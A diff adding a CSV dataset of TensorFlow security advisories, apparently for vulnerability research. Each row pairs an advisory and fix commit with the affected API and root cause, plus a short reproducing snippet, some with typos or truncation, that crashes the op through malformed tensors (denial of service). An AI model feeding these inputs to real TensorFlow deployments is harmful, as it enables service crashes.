@@ -1,0 +1,1677 @@
+Library,Advisory Link,Commit,Parent Module,API,Anomaly,Reproducing Example,Vulnerable Parameter,Root cause 1,Root cause 2,Attack type
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9cr2-8pwr-fhfq,https://github.com/tensorflow/tensorflow/commit/f3f9cb38ecfe5a8a703f2c4a8fead434ef291713,tf.array_ops,tf.raw_ops.QuantizeAndDequantizeV3,Non scalar input,"import tensorflow as tf
+
+signed_input = True
+range_given = False
+narrow_range = False
+axis = -1
+input = tf.constant(-3.5, shape=[1], dtype=tf.float32)
+input_min = tf.constant(-3.5, shape=[1], dtype=tf.float32)
+input_max = tf.constant(-3.5, shape=[1], dtype=tf.float32)
+num_bits = tf.constant([], shape=[0], dtype=tf.int32)
+tf.raw_ops.QuantizeAndDequantizeV3(input=input, input_min=input_min, input_max=input_max, num_bits=num_bits, signed_input=signed_input, range_given=range_given, narrow_range=narrow_range, axis=axis)",num_bits,N.A,check failure,Denial of service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-r26c-679w-mrjm,https://github.com/tensorflow/tensorflow/commit/f3cf67ac5705f4f04721d15e485e192bb319feed,tf.quantization,tf.quantization.fake_quant_with_min_max_vars_gradient,Non scalar input,"import tensorflow as tf
+import numpy as np 
+arg_0=tf.constant(value=np.random.random(size=(2, 2)), shape=(2, 2), dtype=tf.float32)
+arg_1=tf.constant(value=np.random.random(size=(2, 2)), shape=(2, 2), dtype=tf.float32)
+arg_2=tf.constant(value=np.random.random(size=(2, 2)), shape=(2, 2), dtype=tf.float32)
+arg_3=tf.constant(value=np.random.random(size=(2, 2)), shape=(2, 2), dtype=tf.float32)
+arg_4=8
+arg_5=False
+arg_6=''
+tf.quantization.fake_quant_with_min_max_vars_gradient(gradients=arg_0, inputs=arg_1,
+min=arg_2, max=arg_3, num_bits=arg_4, narrow_range=arg_5, name=arg_6)","min, max",N.A,check failure,Denial of service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-mv8m-8x97-937q,https://github.com/tensorflow/tensorflow/commit/552bfced6ce4809db5f3ca305f60ff80dd40c5a3,tf.random,tf.random.gamma,Very large input argument,"import tensorflow as tf
+arg_0=tf.random.uniform(shape=(4,), dtype=tf.int32, maxval=65536)
+arg_1=tf.random.uniform(shape=(4, 4), dtype=tf.float64, maxval=None)
+arg_2=tf.random.uniform(shape=(4, 4, 4, 4, 4), dtype=tf.float64, maxval=None)
+arg_3=tf.float64
+arg_4=48
+arg_5='None'
+tf.random.gamma(shape=arg_0, alpha=arg_1, beta=arg_2, dtype=arg_3, seed=arg_4, name=arg_5)",shape,N.A,check failure,Denial of service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-cv2p-32v3-vhwq,https://github.com/tensorflow/tensorflow/commit/552bfced6ce4809db5f3ca305f60ff80dd40c5a3,tf.raw_ops,tf.raw_ops.RandomPoissonV2,Very large input argument,"import tensorflow as tf
+arg_0=tf.random.uniform(shape=(4,), dtype=tf.int32, maxval=65536)
+arg_1=tf.random.uniform(shape=(4, 4, 4, 4, 4), dtype=tf.float32, maxval=None)
+arg_2=0
+arg_3=0
+arg_4=tf.int32
+arg_5=None
+tf.raw_ops.RandomPoissonV2(shape=arg_0, rate=arg_1, seed=arg_2,
+                           seed2=arg_3, dtype=arg_4, name=arg_5)","shape, rate",N.A,check failure,Denial of service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-mh3m-62v7-68xg,https://github.com/tensorflow/tensorflow/commit/4419d10d576adefa36b0e0a9425d2569f7c0189f,tf.raw_ops,tf.raw_ops.Unbatch,Non scalar input,"import tensorflow as tf
+import numpy as np
+arg_0=tf.constant(value=np.random.random(size=(3, 3, 1)), dtype=tf.float64)
+arg_1=tf.constant(value=np.random.randint(0,100,size=(3, 3, 1)), dtype=tf.int64)
+arg_2=tf.constant(value=np.random.randint(0,100,size=(3, 3,  1)), dtype=tf.int64)
+arg_3=47
+arg_4=''
+arg_5=''
+tf.raw_ops.Unbatch(batched_tensor=arg_0, batch_index=arg_1, id=arg_2, 
+                   timeout_micros=arg_3, container=arg_4, shared_name=arg_5)",id,N.A,check failure,Denial of service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-jqm7-m5q7-3hm5,https://github.com/tensorflow/tensorflow/commit/da0d65cdc1270038e72157ba35bf74b85d9bda11,tf.raw_ops,tf.raw_ops.DrawBoundingBoxes,Non float input,"import tensorflow as tf
+import numpy as np
+arg_0=tf.constant(value=np.random.random(size=(1, 3, 2, 3)), shape=(1, 3, 2, 3), dtype=tf.half)
+arg_1=tf.constant(value=np.random.random(size=(1, 2, 4)), shape=(1, 2, 4), dtype=tf.float32)
+arg_2=''
+tf.raw_ops.DrawBoundingBoxes(images=arg_0, boxes=arg_1, name=arg_2)",boxes,N.A,check failure,Denial of service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-fqxc-pvf8-2w9v,https://github.com/tensorflow/tensorflow/commit/aed36912609fc07229b4d0a7b44f3f48efc00fd0,tf.raw_ops,tf.raw_ops.Eig,Bad input,arg_1=tf.complex128,Tout,N.A,check failure,Denial of service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-37jf-mjv6-xfqw,https://github.com/tensorflow/tensorflow/commit/27a65a43cf763897fecfa5cdb5cc653fc5dd0346,tf.raw_ops,tf.raw_ops.Conv2DBackpropInput,Empty input,"np.ones([3, 1, 0, 3])",out_backprop,N.A,check failure,Denial of service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-qhw4-wwr7-gjc5,https://github.com/tensorflow/tensorflow/commit/c8ba76d48567aed347508e0552a257641931024d,tf.raw_ops,tf.raw_ops.EmptyTensorList,More than one dimension,"tf.ones(dtype=tf.int32, shape=[1, 0])",element_shape,N.A,check failure,Denial of service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-p7hr-f446-x6qf,https://github.com/tensorflow/tensorflow/commit/83dcb4dbfa094e33db084e97c4d0531a559e0ebf,tf.sparse,tf.sparse.cross,Non scalar input,"separator=tf.constant(['a', 'b']",separator,N.A,check failure,Denial of service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-q5jv-m6qw-5g37,https://github.com/tensorflow/tensorflow/commit/611d80db29dd7b0cfb755772c69d60ae5bca05f9,tf.raw_ops,tf.raw_ops.Conv2D,Empty input,"np.ones([1, 0, 2, 1])",input,N.A,division by zero,Denial of service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-g9h5-vr8m-x2h4,https://github.com/tensorflow/tensorflow/commit/bf6b45244992e2ee543c258e519489659c99fb7f,tf.raw_ops,tf.raw_ops.AudioSummaryV2,More than one element,"arg_2=tf.random.uniform(shape=(2,1), dtype=tf.float32, maxval=None)",sample_rate,N.A,check failure,Denial of service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-fhfc-2q7x-929f,https://github.com/tensorflow/tensorflow/commit/c1f491817dec39a26be3c574e86a88c30f3c4770,tf.raw_ops,tf.raw_ops.CollectiveGather,Scalar input,arg_0=1,input,N.A,check failure,Denial of service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-wq6q-6m32-9rv9,https://github.com/tensorflow/tensorflow/commit/cf70b79d2662c0d3c6af74583641e345fc939467,tf.raw_ops,tf.raw_ops.SetSize,Scalar input,arg_2=1,set_shape,N.A,check failure,Denial of service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9v8w-xmr4-wgxp,https://github.com/tensorflow/tensorflow/commit/3db59a042a38f4338aa207922fa2f476e000a6ee,tf.raw_ops,tf.raw_ops.TensorListFromTensor,Rank greater than one,"arg_1=tf.random.uniform(shape=(6, 9, 1, 3), dtype=tf.int64, maxval=65536)",element_shape,N.A,check failure,Denial of service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-vm7x-4qhj-rrcq,https://github.com/tensorflow/tensorflow/commit/bb03fdf4aae944ab2e4b35c7daa051068a8b7f61,tf.raw_ops,tf.raw_ops.TensorListScatter,Rank greater than one,"arg_2=tf.random.uniform(shape=(2, 2, 2), dtype=tf.int32, maxval=65536)",element_shape,N.A,check failure,Denial of service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-vm7x-4qhj-rrcq,https://github.com/tensorflow/tensorflow/commit/bb03fdf4aae944ab2e4b35c7daa051068a8b7f61,tf.raw_ops,tf.raw_ops.TensorListScatterV2,Rank greater than one,"arg_2=tf.random.uniform(shape=(2, 2, 2), dtype=tf.int32, maxval=65536)",element_shape,N.A,check failure,Denial of service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-h7ff-cfc9-wmmh,https://github.com/tensorflow/tensorflow/commit/f3cf67ac5705f4f04721d15e485e192bb319feed,tf.quantization,tf.quantization.fake_quant_with_min_max_vars_per_channel_gradient,Rank other than 1,"arg_1=tf.random.uniform(shape=(1,1), dtype=tf.float32, maxval=None)","min, max",N.A,check failure,Denial of service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-j43h-pgmg-5hjq,https://github.com/tensorflow/tensorflow/commit/32d7bd3defd134f21a4e344c8dfd40099aaf6b18,tf.raw_ops,tf.raw_ops.MaxPool,Dimension mismatch,"ksize = [1, 1, 2, 2]",ksize,N.A,check failure,Denial of service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9vqj-64pv-w55c,https://github.com/tensorflow/tensorflow/commit/c55b476aa0e0bd4ee99d0f3ad18d9d706cd1260a,tf.linalg,tf.linalg.matrix_rank,Empty input,"a = tf.constant([], shape=[0, 1, 1], dtype=tf.float32)",a,N.A,check failure,Denial of service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-w62h-8xjm-fv49,https://github.com/tensorflow/tensorflow/commit/bf4c14353c2328636a18bfad1e151052c81d5f43,tf.raw_ops,tf.raw_ops.DenseBincount,Dimension mismatch,"weights = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.float32, seed=-10000)",weights,N.A,check failure,Denial of service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-wr9v-g9vf-c74v,https://github.com/tensorflow/tensorflow/commit/7a4591fd4f065f4fa903593bc39b2f79530a74b8,tf.raw_ops,tf.raw_ops.RaggedBincount,Empty input,"splits = tf.random.uniform(shape=[0], minval=-10000, maxval=10000, dtype=tf.int64, seed=-7430)",splits,N.A,segfault,Denial of service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9942-r22v-78cp,https://github.com/tensorflow/tensorflow/commit/bd90b3efab4ec958b228cd7cfe9125be1c0cf255,tf.raw_ops,tf.raw_ops.LRNGrad,Rank other than 4,"utput_image = tf.random.uniform(shape=[4, 4, 4, 4, 4, 4], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2033)",output_image,N.A,check failure,Denial of service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-p2xf-8hgm-hpw5,https://github.com/tensorflow/tensorflow/commit/72180be03447a10810edca700cbc9af690dfeb51,tf.raw_ops,tf.raw_ops.ParameterizedTruncatedNormal,Type mismatch,"shape = tf.random.uniform(shape=[3], minval=-10000, maxval=10000, dtype=tf.int64, seed=4894)",shape,N.A,check failure,Denial of service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-m6vp-8q9j-whx4,https://github.com/tensorflow/tensorflow/commit/5dd7b86b84a864b834c6fa3d7f9f51c87efa99d4,tf.raw_ops,tf.raw_ops.Save,int64 tensor,"data = tf.cast(tf.random.uniform(shape=[1], minval=-10000, maxval=10000, dtype=tf.int64, seed=-2021), tf.uint64)",data,N.A,check failure,Denial of service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-m6vp-8q9j-whx4,https://github.com/tensorflow/tensorflow/commit/5dd7b86b84a864b834c6fa3d7f9f51c87efa99d4,tf.raw_ops,f.raw_ops.SaveSlices,int64 tensor,"data = tf.cast(tf.random.uniform(shape=[1], minval=-10000, maxval=10000, dtype=tf.int64, seed=9712), tf.uint32)",data,N.A,check failure,Denial of service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-397c-5g2j-qxpv,https://github.com/tensorflow/tensorflow/commit/40adbe4dd15b582b0210dfbf40c243a62f5119fa,tf.raw_ops,tf.raw_ops.SparseBincount,Empty input,"indices = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.int64, seed=-1288)
+values = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.int32, seed=-9366)
+dense_shape = tf.random.uniform(shape=[0], minval=-10000, maxval=10000, dtype=tf.int64, seed=-9878)","indices, values, dense_shape",N.A,segfault,Denial of service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-m6cv-4fmf-66xf,https://github.com/tensorflow/tensorflow/commit/88f93dfe691563baa4ae1e80ccde2d5c7a143821,tf.raw_ops,tf.raw_ops.RaggedTensorToVariant,Rank other than 1,"rt_nested_splits = tf.constant([0,32,64], shape=[3], dtype=tf.int64)",rt_nested_splits,N.A,check failure,Denial of service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-vxv8-r8q2-63xw,https://github.com/tensorflow/tensorflow/commit/8741e57d163a079db05a7107a7609af70931def4,tf.raw_ops,tf.raw_ops.FractionalMaxPoolGrad,Dimension mismatch,"orig_input = tf.constant(.453409232, shape=[1,7,13,1], dtype=tf.float32)
+orig_output = tf.constant(.453409232, shape=[1,7,13,1], dtype=tf.float32)
+out_backprop = tf.constant(.453409232, shape=[1,7,13,1], dtype=tf.float32)","orig_input, orig_output, out_backprop",N.A,check failure,Denial of service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-v7vw-577f-vp8x,https://github.com/tensorflow/tensorflow/commit/49b3824d83af706df0ad07e4e677d88659756d89,tf.raw_ops,tf.raw_ops.QuantizedRelu,Non scalar input,"min_features = tf.constant([], shape=[0], dtype=tf.float32)","min_features, max_features",N.A,segfault,Denial of service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-v7vw-577f-vp8x,https://github.com/tensorflow/tensorflow/commit/49b3824d83af706df0ad07e4e677d88659756d89,tf.raw_ops,tf.raw_ops.QuantizedRelu6,Non scalar input,"max_features = tf.constant(-128, shape=[1], dtype=tf.float32)","min_features, max_features",N.A,segfault,Denial of service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-vgvh-2pf4-jr2x,https://github.com/tensorflow/tensorflow/commit/73ad1815ebcfeb7c051f9c2f7ab5024380ca8613,tf.raw_ops,tf.raw_ops.QuantizeDownAndShrinkRange,Non scalar input,"input_min = tf.constant([], shape=[0], dtype=tf.float32)
+input_max = tf.constant(-256, shape=[1], dtype=tf.float32)","input_min, input_max",N.A,segfault,Denial of service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-689c-r7h2-fv9v,https://github.com/tensorflow/tensorflow/commit/aca766ac7693bf29ed0df55ad6bfcc78f35e7f48,tf.raw_ops,tf.raw_ops.QuantizedMatMul,Non scalar input,"min_a = tf.constant([], shape=[0], dtype=tf.float32)
+max_a = tf.constant(0, shape=[1], dtype=tf.float32)
+min_b = tf.constant(0, shape=[1], dtype=tf.float32)
+max_b = tf.constant(0, shape=[1], dtype=tf.float32)","min_a, max_a, min_b, max_b",N.A,segfault,Denial of service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9j4v-pp28-mxv7,https://github.com/tensorflow/tensorflow/commit/785d67a78a1d533759fcd2f5e8d6ef778de849e0,tf.raw_ops,tf.raw_ops.FakeQuantWithMinMaxVarsPerChannel,Rank other than 1,"min = tf.constant([], shape=[4,0,0], dtype=tf.float32)
+max = tf.constant(0, shape=[4], dtype=tf.float32)","min, max",N.A,check failure,Denial of service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-4pc4-m9mj-v2r9,https://github.com/tensorflow/tensorflow/commit/785d67a78a1d533759fcd2f5e8d6ef778de849e0,tf.raw_ops,tf.raw_ops.QuantizedBiasAdd,Rank other than 0,"min_input = tf.constant([], shape=[0], dtype=tf.float32)
+max_input = tf.constant(0, shape=[1], dtype=tf.float32)
+min_bias = tf.constant(0, shape=[1], dtype=tf.float32)
+max_bias = tf.constant(0, shape=[1], dtype=tf.float32)","min_input, max_input, min_bias, max_bias",N.A,segfault,Denial of service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-wqmc-pm8c-2jhc,https://github.com/tensorflow/tensorflow/commit/785d67a78a1d533759fcd2f5e8d6ef778de849e0,tf.raw_ops,tf.raw_ops.Requantize,Rank other than 0,"input_min = tf.constant([], shape=[0], dtype=tf.float32)
+input_max = tf.constant(-256, shape=[1], dtype=tf.float32)
+requested_output_min = tf.constant(-256, shape=[1], dtype=tf.float32)
+requested_output_max = tf.constant(-256, shape=[1], dtype=tf.float32)","input_min, input_max, requested_output_min, requested_output_max",N.A,segfault,Denial of service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9fpg-838v-wpv7,https://github.com/tensorflow/tensorflow/commit/785d67a78a1d533759fcd2f5e8d6ef778de849e0,tf.raw_ops,tf.raw_ops.FakeQuantWithMinMaxVars,Rank other than 0,"min = tf.constant(0, shape=[2,3], dtype=tf.float32)
+max = tf.constant(0, shape=[2,3], dtype=tf.float32)","min, max",N.A,check failure,Denial of service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-g35r-369w-3fqp,https://github.com/tensorflow/tensorflow/commit/785d67a78a1d533759fcd2f5e8d6ef778de849e0,tf.raw_ops,tf.raw_ops.QuantizedInstanceNorm,Rank other than 0,"x_min = tf.constant([], shape=[0], dtype=tf.float32)
+x_max = tf.constant(0, shape=[], dtype=tf.float32)","x_min, x_max",N.A,segfault,Denial of service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-q2c3-jpmc-gfjx,https://github.com/tensorflow/tensorflow/commit/50156d547b9a1da0144d7babe665cf690305b33c,tf.raw_ops,tf.raw_ops.Conv2DBackpropInput,Rank other than 4,"input_sizes = tf.constant([65534,65534], shape=[2], dtype=tf.int32)",input_sizes,N.A,check failure,Denial of service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-2475-53vw-vp25,https://github.com/tensorflow/tensorflow/commit/3a6ac52664c6c095aa2b114e742b0aa17fdce78f,tf.raw_ops,tf.raw_ops.AvgPoolGrad,Does not fully validate the input,"orig_input_shape = tf.constant(-536870912, shape=[4], dtype=tf.int32)",orig_input_shape,N.A,check failure,Denial of service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-v6h3-348g-6h5x,https://github.com/tensorflow/tensorflow/commit/49b3824d83af706df0ad07e4e677d88659756d89,tf.raw_ops,tf.raw_ops.QuantizedAdd,Rank other than 0,"min_x = tf.constant([], shape=[0], dtype=tf.float32)
+max_x = tf.constant(0, shape=[], dtype=tf.float32)
+min_y = tf.constant(0, shape=[], dtype=tf.float32)
+max_y = tf.constant(0, shape=[], dtype=tf.float32)","min_input, max_input",N.A,segfault,Denial of service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-4w68-4x85-mjj9,https://github.com/tensorflow/tensorflow/commit/7cdf9d4d2083b739ec81cfdace546b0c99f50622,tf.raw_ops,tf.raw_ops.QuantizedAvgPool,Rank other than 0,"min_input = tf.constant([], shape=[0], dtype=tf.float32)
+max_input = tf.constant(0, shape=[1], dtype=tf.float32","min_input, max_input",N.A,segfault,Denial of service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-qxpx-j395-pw36,https://github.com/tensorflow/tensorflow/commit/bce3717eaef4f769019fd18e990464ca4a2efeea,tf.raw_ops,tf.raw_ops.LowerBound,Empty input,"sorted_inputs = tf.constant([], shape=[10,0], dtype=tf.float32)",sorted_inputs,nullptr dereference,segfault,Denial of service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-qxpx-j395-pw36,https://github.com/tensorflow/tensorflow/commit/bce3717eaef4f769019fd18e990464ca4a2efeea,tf.raw_ops,tf.raw_ops.UpperBound,Empty input,"sorted_inputs = tf.constant([], shape=[2,2,0,0,0,0,0,2], dtype=tf.float32)",sorted_inputs,nullptr dereference,segfault,Denial of service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-f7r5-q7cx-h668,https://github.com/tensorflow/tensorflow/commit/2a458fc4866505be27c62f81474ecb2b870498fa,tf.raw_ops,tf.raw_ops.BlockLSTMGradV2,Rank other than 1,"wci = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
+wcf = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
+wco = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
+b = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)","wci, wcf, wco, b",N.A,segfault,Denial of service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-f7r5-q7cx-h668,https://github.com/tensorflow/tensorflow/commit/2a458fc4866505be27c62f81474ecb2b870498fa,tf.raw_ops,tf.raw_ops.BlockLSTMGradV2,Rank other than 2,"cs_prev = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
+h_prev = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)
+w = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)","w, cs_prev, h_prev",N.A,segfault,Denial of service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-f7r5-q7cx-h668,https://github.com/tensorflow/tensorflow/commit/2a458fc4866505be27c62f81474ecb2b870498fa,tf.raw_ops,tf.raw_ops.BlockLSTMGradV2,Rank other than 3,"x = tf.constant(0.504355371, shape=[1,1,1], dtype=tf.float32)",x,N.A,segfault,Denial of service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-84jm-4cf3-9jfm,https://github.com/tensorflow/tensorflow/commit/03a659d7be9a1154fdf5eeac221e5950fec07dad,tf.raw_ops,tf.raw_ops.FractionalAvgPoolGrad,Negative argument,"orig_input_tensor_shape = tf.constant(-1879048192, shape=[4], dtype=tf.int64)",orig_input_tensor_shape,overflow,check failure,Denial of service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-84jm-4cf3-9jfm,https://github.com/tensorflow/tensorflow/commit/03a659d7be9a1154fdf5eeac221e5950fec07dad,tf.raw_ops,tf.raw_ops.FractionalAvgPoolGrad,Rank other than 4,"out_backprop = tf.constant([], shape=[0,0,0,0], dtype=tf.float64)",out_backprop,overflow,check failure,Denial of service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-84jm-4cf3-9jfm,https://github.com/tensorflow/tensorflow/commit/03a659d7be9a1154fdf5eeac221e5950fec07dad,tf.raw_ops,tf.raw_ops.FractionalAvgPoolGrad,Negative argument,"out_backprop = tf.constant([], shape=[0,0,0,0], dtype=tf.float64)",out_backprop,overflow,check failure,Denial of service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-wxjj-cgcx-r3vq,https://github.com/tensorflow/tensorflow/commit/9178ac9d6389bdc54638ab913ea0e419234d14eb,tf.raw_ops,tf.raw_ops.AvgPool3DGrad,Very large input argument,"orig_input_shape = tf.constant(1879048192, shape=[5], dtype=tf.int32)",orig_input_shape,overflow,check failure,Denial of service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-h5vq-gw2c-pq47,https://github.com/tensorflow/tensorflow/commit/5f945fc6409a3c1e90d6970c9292f805f6e6ddf2,tf.raw_ops,tf.raw_ops.UnbatchGrad,Non scalar input,"id=tf.constant([1,], dtype=tf.int64)",id,N.A,check failure,crash
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-h5vq-gw2c-pq47,https://github.com/tensorflow/tensorflow/commit/5f945fc6409a3c1e90d6970c9292f805f6e6ddf2,tf.raw_ops,tf.raw_ops.UnbatchGrad,Contain more than three times the number of elements ,"batch_index=tf.constant([[0,0,0 ], ], dtype=tf.int64)",batch_index,N.A,check failure,crash
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-mgmh-g2v6-mqw5,https://github.com/tensorflow/tensorflow/commit/3a6ac52664c6c095aa2b114e742b0aa17fdce78f,tf.raw_ops,tf.raw_ops.AvgPool,Negative argument,"ksize = [1, 1e20, 1, 1]",ksize,N.A,check failure,crash
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-x989-q2pq-4q5x,https://github.com/tensorflow/tensorflow/commit/37cefa91bee4eace55715eeef43720b958a01192,tf.raw_ops,tf.raw_ops.RaggedRange,Very large float,"limits=[10.0,1e20]",limits,N.A,InvalidArgument,crash
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-v5xg-3q2c-c2r4,https://github.com/tensorflow/tensorflow/commit/b5f6fbfba76576202b72119897561e3bd4f179c7,tf.raw_ops,tf.raw_ops.TensorListReserve,More than one element,"num_elements=tf.constant([1,1], dtype=tf.int32)",num_elements,N.A,check failure,N.A
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-97p7-w86h-vcf9,https://github.com/tensorflow/tensorflow/commit/c65c67f88ad770662e8f191269a907bf2b94b1bf,tf.raw_ops,tf.raw_ops.SobolSample,Non scalar input,"dim=tf.constant([1,0]), num_results=tf.constant([1]), skip=tf.constant([1])","dim, num_results, skip",N.A,check failure,Denial of service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-f4w6-h4f5-wx45,https://github.com/tensorflow/tensorflow/commit/61f0f9b94df8c0411f0ad0ecc2fec2d3f3c33555,tf,tf.reshape,Overflowing tensor elements,"tensor=[[1]],shape=tf.constant([0 for i in range(255)], dtype=tf.int64)","tensor, shape",N.A,check failure,Denial of service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-xrp2-fhq4-4q3w,https://github.com/tensorflow/tensorflow/commit/e57fd691c7b0fd00ea3bfe43444f30c1969748b5,tf.raw_ops,tf.histogram_fixed_width,NaN input,values=np.nan,values,N.A,N.A,crash
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-cwpm-f78v-7m5c,https://github.com/tensorflow/tensorflow/commit/bd4d5583ff9c8df26d47a23e508208844297310e,tf.raw_ops,tf.ragged.constant,Empty input,pylist=[],pylist,N.A,memory consumption,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-hx9q-2mx4-m4pg,https://github.com/tensorflow/tensorflow/commit/84563f265f28b3c36a15335c8b005d405260e943,tf.strings,tf.strings.unsorted_segment_join,Negative argument,num_segments=-1,num_segments,N.A,check failure,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-hx9q-2mx4-m4pg,https://github.com/tensorflow/tensorflow/commit/20cb18724b0bf6c09071a3f53434c4eec53cc147,tf.strings,tf.strings.unsorted_segment_join,Negative argument,num_segments=-1,num_segments,N.A,check failure,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-2r2f-g8mw-9gvr,https://github.com/tensorflow/tensorflow/commit/30721cf564cb029d34535446d6a5a6357bebc8e7,tf.raw_ops,tf.raw_ops.EditDistance,Negative argument,"hypothesis_indices = tf.constant(-1250999896764, shape=[3, 3], dtype=tf.int64), truth_indices = tf.constant(-1250999896764, shape=[3, 3], dtype=tf.int64)","hypothesis_indices, truth_indices",N.A,segfault,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-jjm6-4vf7-cjh4,https://github.com/tensorflow/tensorflow/commit/acd56b8bcb72b163c834ae4f18469047b001fadf,tf.raw_ops,tf.raw_ops.SpaceToBatchND,Negative argument,"block_shape = tf.constant(-1879048192, shape=[2], dtype=tf.int64)",block_shape,integer overflow,check failure,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-pqhm-4wvf-2jg8,https://github.com/tensorflow/tensorflow/commit/0f0b080ecde4d3dfec158d6f60da34d5e31693c4,tf.raw_ops,tf.raw_ops.QuantizedConv2D,Empty input,"min_input = tf.constant([], shape=[0], dtype=tf.float32)
+max_input = tf.constant(0, shape=[], dtype=tf.float32)
+min_filter = tf.constant(0, shape=[], dtype=tf.float32)
+max_filter = tf.constant(0, shape=[], dtype=tf.float32)","min_input, max_input, min_filter, max_filter",nullptr dereference,N.A,N.A
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-rc9w-5c64-9vqq,https://github.com/tensorflow/tensorflow/commit/11ced8467eccad9c7cb94867708be8fa5c66c730,tf.raw_ops,tf.raw_ops.SparseTensorDenseAdd,Dimension mismatch,"a_values = tf.constant([], shape=[0], dtype=tf.float32)
+a_shape = tf.constant([6, 12], shape=[2], dtype=tf.int64) a_indices = tf.constant(0, shape=[17, 2], dtype=tf.int64)","a_values, a_shape, a_indices",nullptr dereference,N.A,N.A
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-5wpj-c6f7-24x8,https://github.com/tensorflow/tensorflow/commit/a5b89cd68c02329d793356bda85d079e9e69b4e7,tf.raw_ops,tf.raw_ops.QueueIsClosedV2,Empty input,handle=[],handle,N.A,nullptr dereference,undefined behavior
